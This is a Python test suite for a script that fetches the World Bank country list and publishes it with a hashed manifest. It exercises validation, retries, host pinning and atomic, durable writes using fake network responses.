"""scripts/snapshot_wb_countries.py against fake transports. Offline; any socket use fails the test.

The script is loaded from its file, as the other ieg_* test files do. A fake transport
replaces the network, and the sleep is replaced so that retries cost no time. The autouse
fixture refuses socket connection, name lookup and creation, so a call that reached the
real network would fail rather than succeed.
"""
import hashlib
import importlib.util
import json
import re
import socket
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
_SCRIPT = REPO_ROOT / "scripts" / "snapshot_wb_countries.py"
_spec = importlib.util.spec_from_file_location("snapshot_wb_countries", _SCRIPT)
reg = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(reg)

JSON_TYPE = {"content-type": "application/json; charset=utf-8"}


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    def refuse(*args, **kwargs):
        raise AssertionError("a unit test tried to open a network connection")

    monkeypatch.setattr(socket.socket, "connect", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)


# --- synthetic registry responses ------------------------------------------------------


def country(rid, iso2, name, region="Sub-Saharan Africa"):
    return {
        "id": rid,
        "iso2Code": iso2,
        "name": name,
        "region": {"id": "SSF", "iso2code": "ZG", "value": region},
        "incomeLevel": {"id": "LIC", "iso2code": "XM", "value": "Low income"},
        "capitalCity": "Nowhere",
    }


def aggregate(rid, iso2, name):
    return {
        "id": rid,
        "iso2Code": iso2,
        "name": name,
        "region": {"id": "NA", "iso2code": "NA", "value": "Aggregates"},
        "incomeLevel": {"id": "NA", "iso2code": "NA", "value": "Aggregates"},
        "capitalCity": "",
    }


def body_of(records, total=None, pages=1):
    meta = {"page": 1, "pages": pages, "per_page": "1000",
            "total": len(records) if total is None else total, "lastupdated": "2026-10-01"}
    return json.dumps([meta, records], ensure_ascii=False).encode("utf-8")


GOOD = body_of([
    country("AGO", "AO", "Angola"),
    country("XKX", "XK", "Kosovo", region="Europe & Central Asia"),
    aggregate("AFE", "ZH", "Africa Eastern and Southern"),
])


class FakeTransport:
    """Returns the queued responses in order; the last one repeats. An exception instance is raised instead."""

    def __init__(self, *items):
        self.items = list(items)
        self.calls = []

    def __call__(self, url):
        self.calls.append(url)
        item = self.items.pop(0) if len(self.items) > 1 else self.items[0]
        if isinstance(item, BaseException):
            raise item
        return item


def ok(body=GOOD, content_type=JSON_TYPE["content-type"], final_url=reg.COUNTRY_URL, redirects=()):
    headers = {"content-type": content_type}
    return reg.Response(200, headers, body, final_url, list(redirects))


def status(code):
    return reg.Response(code, {"content-type": "text/plain"}, b"", reg.COUNTRY_URL, [])


def no_sleep(seconds):
    raise AssertionError("the retry path must not sleep in this test")


def sleeps_recorded():
    waits = []
    return waits, waits.append


def _sha(data):
    return hashlib.sha256(data).hexdigest()


def _read_manifest(out):
    return json.loads((out / "manifest.json").read_text(encoding="utf-8"))


# --- publishing: raw bytes, manifest, pins --------------------------------------------------


def test_raw_bytes_are_kept_unchanged_and_the_manifest_describes_them(tmp_path):
    out = tmp_path / "countries"
    sha = reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)

    assert (out / "raw" / "countries.json").read_bytes() == GOOD
    manifest_bytes = (out / "manifest.json").read_bytes()
    assert sha == _sha(manifest_bytes)
    manifest = json.loads(manifest_bytes)
    assert manifest["raw"] == {"file": "raw/countries.json", "sha256": _sha(GOOD), "bytes": len(GOOD)}
    assert manifest["source"]["url"] == reg.COUNTRY_URL
    assert manifest["source"]["http_status"] == 200
    assert manifest["source"]["content_type"] == JSON_TYPE["content-type"]
    assert manifest["source"]["sha256"] == _sha(GOOD)
    assert manifest["validated"]["record_count"] == 3
    assert manifest["validated"]["country_count"] == 2
    assert manifest["validated"]["aggregate_count"] == 1
    assert manifest["validated"]["distinct_ids"] == 3
    assert manifest["validated"]["meta"]["total"] == 3
    assert manifest["outputs"] == {"raw/countries.json": {"bytes": len(GOOD), "sha256": _sha(GOOD)}}


def test_manifest_records_the_tool_identity_with_a_dirty_flag(tmp_path):
    out = tmp_path / "countries"
    reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)
    tool = _read_manifest(out)["tool"]

    assert tool["path"] == "scripts/snapshot_wb_countries.py"
    assert tool["script_sha256"] == _sha(_SCRIPT.read_bytes())
    assert isinstance(tool["git_dirty"], bool)
    assert re.fullmatch(r"[0-9a-f]{40}", tool["git_sha"])


def test_fetch_timestamp_is_utc_and_present(tmp_path):
    out = tmp_path / "countries"
    reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)
    fetched = _read_manifest(out)["source"]["fetched_at_utc"]

    assert re.fullmatch(r"[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z", fetched)


def test_the_manifest_does_not_embed_its_own_digest(tmp_path):
    out = tmp_path / "countries"
    reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)
    text = (out / "manifest.json").read_text(encoding="utf-8")

    assert "manifest_sha256" not in text


# --- the documented shape is refused when it is not met ----------------------------------


def test_meta_total_that_differs_from_the_record_count_is_refused(tmp_path):
    out = tmp_path / "countries"
    bad = body_of(json.loads(GOOD)[1], total=4)
    with pytest.raises(reg.SourceRefused, match="meta.total is 4"):
        reg.build(out, transport=FakeTransport(ok(bad)), sleep=no_sleep)
    assert not out.exists()
    assert not out.with_name(out.name + ".partial").exists()


def test_more_than_one_page_is_refused(tmp_path):
    out = tmp_path / "countries"
    bad = body_of(json.loads(GOOD)[1], pages=2)
    with pytest.raises(reg.SourceRefused, match="meta.pages is 2"):
        reg.build(out, transport=FakeTransport(ok(bad)), sleep=no_sleep)
    assert not out.exists()


def test_a_duplicate_id_is_refused(tmp_path):
    out = tmp_path / "countries"
    records = [country("AGO", "AO", "Angola"), country("AGO", "AO", "Angola again")]
    with pytest.raises(reg.SourceRefused, match="appears more than once"):
        reg.build(out, transport=FakeTransport(ok(body_of(records))), sleep=no_sleep)
    assert not out.exists()


def test_an_html_page_is_refused_by_content_type(tmp_path):
    out = tmp_path / "countries"
    with pytest.raises(reg.SourceRefused, match="is not JSON"):
        reg.build(out, transport=FakeTransport(ok(b"<html>maintenance</html>", "text/html")), sleep=no_sleep)
    assert not out.exists()


def test_an_html_body_under_a_json_content_type_is_refused_by_parsing(tmp_path):
    out = tmp_path / "countries"
    with pytest.raises(reg.SourceRefused, match="not JSON"):
        reg.build(out, transport=FakeTransport(ok(b"<html>maintenance</html>")), sleep=no_sleep)
    assert not out.exists()


def test_an_api_error_envelope_is_refused_by_shape(tmp_path):
    out = tmp_path / "countries"
    envelope = json.dumps([{"message": [{"id": "120", "key": "Invalid format"}]}]).encode("utf-8")
    with pytest.raises(reg.SourceRefused, match="documented"):
        reg.build(out, transport=FakeTransport(ok(envelope)), sleep=no_sleep)
    assert not out.exists()


def test_a_duplicate_key_inside_a_json_object_is_refused(tmp_path):
    out = tmp_path / "countries"
    raw = b'[{"total": 1, "total": 1, "pages": 1}, [{"id": "AGO", "iso2Code": "AO", "name": "A", "region": {"value": "x"}}]]'
    with pytest.raises(reg.SourceRefused, match="duplicate key"):
        reg.build(out, transport=FakeTransport(ok(raw)), sleep=no_sleep)
    assert not out.exists()


def test_a_non_finite_number_is_refused(tmp_path):
    out = tmp_path / "countries"
    raw = b'[{"total": NaN, "pages": 1}, []]'
    with pytest.raises(reg.SourceRefused, match="non-finite"):
        reg.build(out, transport=FakeTransport(ok(raw)), sleep=no_sleep)


def test_a_record_without_a_region_value_is_refused(tmp_path):
    out = tmp_path / "countries"
    rec = country("AGO", "AO", "Angola")
    del rec["region"]
    with pytest.raises(reg.SourceRefused, match="lacks a region value"):
        reg.build(out, transport=FakeTransport(ok(body_of([rec]))), sleep=no_sleep)


def test_a_record_without_an_iso2_code_is_refused(tmp_path):
    out = tmp_path / "countries"
    rec = country("AGO", "", "Angola")
    with pytest.raises(reg.SourceRefused, match="lacks a usable id"):
        reg.build(out, transport=FakeTransport(ok(body_of([rec]))), sleep=no_sleep)


def test_a_boolean_total_is_not_a_count(tmp_path):
    out = tmp_path / "countries"
    doc = json.loads(GOOD)
    doc[0]["total"] = True
    with pytest.raises(reg.SourceRefused, match="boolean"):
        reg.build(out, transport=FakeTransport(ok(json.dumps(doc).encode())), sleep=no_sleep)


# --- aggregates are not countries ----------------------------------------------------------


def test_aggregates_are_counted_apart_from_countries():
    _meta, records = reg.parse_registry(GOOD)
    counts = reg.registry_counts(records)

    assert counts["country_count"] == 2
    assert counts["aggregate_count"] == 1
    assert counts["record_count"] == 3


def test_aggregate_status_comes_from_the_region_value_not_the_name():
    records = [
        aggregate("AFE", "ZH", "Some Name That Looks Like A Country"),
        country("ZAF", "ZA", "South Africa"),
    ]
    _meta, parsed = reg.parse_registry(body_of(records))
    counts = reg.registry_counts(parsed)

    assert counts["aggregate_count"] == 1
    assert counts["country_count"] == 1


# --- fetch: retries, caps, pins ----------------------------------------------------------


def test_a_404_is_not_retried():
    transport = FakeTransport(status(404))
    waits, sleep = sleeps_recorded()
    with pytest.raises(reg.FetchError, match="HTTP 404"):
        reg.fetch(reg.COUNTRY_URL, transport=transport, sleep=sleep)
    assert len(transport.calls) == 1
    assert waits == []


@pytest.mark.parametrize("code", [429, 500, 503])
def test_retryable_status_is_retried_then_succeeds(code):
    transport = FakeTransport(status(code), ok())
    waits, sleep = sleeps_recorded()
    resp, attempts = reg.fetch(reg.COUNTRY_URL, transport=transport, sleep=sleep)
    assert resp.status == 200
    assert [a["outcome"] for a in attempts] == ["http", "http"]
    assert waits == [10.0]


def test_a_timeout_is_retried_and_the_cap_is_enforced(tmp_path):
    out = tmp_path / "countries"
    transport = FakeTransport(TimeoutError("timed out"))
    waits, sleep = sleeps_recorded()
    with pytest.raises(reg.FetchError, match="3 attempts failed"):
        reg.build(out, transport=transport, sleep=sleep)
    assert len(transport.calls) == reg.ATTEMPTS == 3
    assert waits == [10.0, 30.0]
    assert not out.exists()


def test_an_oversize_body_fails_at_once(tmp_path):
    out = tmp_path / "countries"
    transport = FakeTransport(reg.OversizeError("too big"))
    with pytest.raises(reg.OversizeError):
        reg.build(out, transport=transport, sleep=no_sleep)
    assert len(transport.calls) == 1


def test_a_non_https_url_is_refused_before_any_request():
    transport = FakeTransport(ok())
    with pytest.raises(reg.FetchError, match="not an https URL"):
        reg.fetch("http://api.worldbank.org/v2/country?format=json", transport=transport, sleep=no_sleep)
    assert transport.calls == []


def test_a_url_on_another_host_is_refused_before_any_request():
    transport = FakeTransport(ok())
    with pytest.raises(reg.FetchError, match="not an https URL on api.worldbank.org"):
        reg.fetch("https://example.org/v2/country", transport=transport, sleep=no_sleep)
    assert transport.calls == []


def test_a_redirect_to_another_host_is_refused(tmp_path):
    out = tmp_path / "countries"
    hop = [{"status": 301, "from": reg.COUNTRY_URL, "to": "https://evil.example/countries.json"}]
    with pytest.raises(reg.FetchError, match="redirect target"):
        reg.build(out, transport=FakeTransport(ok(redirects=hop)), sleep=no_sleep)
    assert not out.exists()


def test_a_final_url_on_another_host_is_refused(tmp_path):
    out = tmp_path / "countries"
    with pytest.raises(reg.FetchError, match="final URL"):
        reg.build(out, transport=FakeTransport(ok(final_url="https://evil.example/x")), sleep=no_sleep)
    assert not out.exists()


def test_a_redirect_to_the_same_host_is_recorded_in_the_manifest(tmp_path):
    out = tmp_path / "countries"
    hop = [{"status": 301, "from": "https://api.worldbank.org/a", "to": reg.COUNTRY_URL}]
    reg.build(out, transport=FakeTransport(ok(redirects=hop)), sleep=no_sleep)
    assert _read_manifest(out)["source"]["redirects"] == hop


def test_the_real_transport_is_not_reached_by_a_unit_test():
    # The autouse fixture makes the real transport fail. An accidental network call is an error here.
    with pytest.raises(AssertionError, match="network connection"):
        reg._open_over_network(reg.COUNTRY_URL)


# --- destination, durability, refusal to overwrite -----------------------------------------


def test_an_existing_nonempty_destination_is_refused_and_untouched(tmp_path):
    out = tmp_path / "countries"
    out.mkdir()
    keep = out / "keep.txt"
    keep.write_text("earlier run", encoding="utf-8")
    transport = FakeTransport(ok())
    with pytest.raises(reg.OutputRefused, match="not an empty directory"):
        reg.build(out, transport=transport, sleep=no_sleep)
    assert keep.read_text(encoding="utf-8") == "earlier run"
    assert transport.calls == []


def test_a_leftover_partial_is_refused_and_kept(tmp_path):
    out = tmp_path / "countries"
    partial = tmp_path / "countries.partial"
    partial.mkdir()
    (partial / "left.txt").write_text("unfinished", encoding="utf-8")
    transport = FakeTransport(ok())
    with pytest.raises(reg.OutputRefused, match="did not finish"):
        reg.build(out, transport=transport, sleep=no_sleep)
    assert (partial / "left.txt").read_text(encoding="utf-8") == "unfinished"
    assert transport.calls == []
    assert not out.exists()


def test_a_missing_parent_is_refused_and_not_created(tmp_path):
    out = tmp_path / "absent-parent" / "countries"
    with pytest.raises(reg.OutputRefused, match="does not exist"):
        reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)
    assert not (tmp_path / "absent-parent").exists()


def test_a_failure_before_the_rename_publishes_nothing_and_keeps_the_partial(tmp_path, monkeypatch):
    out = tmp_path / "countries"
    partial = tmp_path / "countries.partial"

    def boom(src, dst):
        raise OSError("rename refused")

    monkeypatch.setattr(reg.os, "rename", boom)
    with pytest.raises(OSError, match="rename refused"):
        reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)
    assert not out.exists()
    assert (partial / "raw" / "countries.json").read_bytes() == GOOD


def test_a_failed_parent_fsync_after_the_rename_reports_durability_unconfirmed(tmp_path, monkeypatch, capsys):
    out = tmp_path / "countries"
    real = reg._fsync_dir

    def fail_on_parent(path):
        if Path(path) == tmp_path:
            raise OSError("parent fsync refused")
        real(path)

    monkeypatch.setattr(reg, "_fsync_dir", fail_on_parent)
    monkeypatch.setattr(reg, "_open_over_network", FakeTransport(ok()))
    assert reg.main(["--out", str(out)]) == 3
    assert (out / "manifest.json").exists()
    assert "durability is not confirmed" in capsys.readouterr().err


def test_directories_are_fsynced_bottom_up_and_the_parent_after_the_rename(tmp_path, monkeypatch):
    out = tmp_path / "countries"
    events = []
    real_fsync = reg._fsync_dir
    real_rename = reg.os.rename

    def spy_fsync(path):
        events.append(("fsync", Path(path).name))
        real_fsync(path)

    def spy_rename(src, dst):
        events.append(("rename", Path(dst).name))
        real_rename(src, dst)

    monkeypatch.setattr(reg, "_fsync_dir", spy_fsync)
    monkeypatch.setattr(reg.os, "rename", spy_rename)
    reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)

    rename_at = events.index(("rename", "countries"))
    before, after = events[:rename_at], events[rename_at + 1:]
    # raw/ holds countries.json and is fsynced before its parent, the partial directory.
    assert before.index(("fsync", "raw")) < before.index(("fsync", "countries.partial"))
    assert after == [("fsync", tmp_path.name)]


def test_each_file_is_created_exclusively_under_its_own_name(tmp_path, monkeypatch):
    out = tmp_path / "countries"
    seen = []
    real = reg._write_exclusive

    def spy(path, data):
        seen.append(Path(path).name)
        real(path, data)

    monkeypatch.setattr(reg, "_write_exclusive", spy)
    reg.build(out, transport=FakeTransport(ok()), sleep=no_sleep)
    assert sorted(seen) == ["countries.json", "manifest.json"]


# --- the program entry point --------------------------------------------------------------


def test_main_publishes_and_prints_the_manifest_sha(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(reg, "_open_over_network", FakeTransport(ok()))
    out = tmp_path / "countries"
    assert reg.main(["--out", str(out)]) == 0
    printed = capsys.readouterr().out.strip()
    assert printed == f"manifest sha256: {_sha((out / 'manifest.json').read_bytes())}"


def test_main_refuses_with_exit_1_and_writes_nothing(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(reg, "_open_over_network", FakeTransport(ok(body_of(json.loads(GOOD)[1], total=9))))
    monkeypatch.setattr(reg.time, "sleep", no_sleep)
    out = tmp_path / "countries"
    assert reg.main(["--out", str(out)]) == 1
    assert not out.exists()
    assert "refused" in capsys.readouterr().err
